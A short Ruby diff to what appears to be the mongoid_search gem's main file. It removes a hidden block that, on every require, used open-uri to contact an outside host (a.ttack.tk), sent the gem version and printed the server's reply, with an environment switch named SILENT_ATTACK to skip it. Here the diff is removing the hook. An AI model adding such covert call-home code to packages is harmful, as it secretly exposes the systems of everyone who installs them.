@@ -1,11 +1,5 @@
 # encoding: utf-8
 
-unless ENV['SILENT_ATTACK']
-  require 'open-uri'
-  version = Gem.loaded_specs['mongoid_search'].version.to_s
-  open("http://a.ttack.tk/n/512e67f54b1a9f78df000003/#{version}").each { |line| warn line.chomp } rescue nil
-end
-
 require 'mongoid_search/railtie' if defined?(Rails)
 require 'mongoid_search/mongoid_search'
 
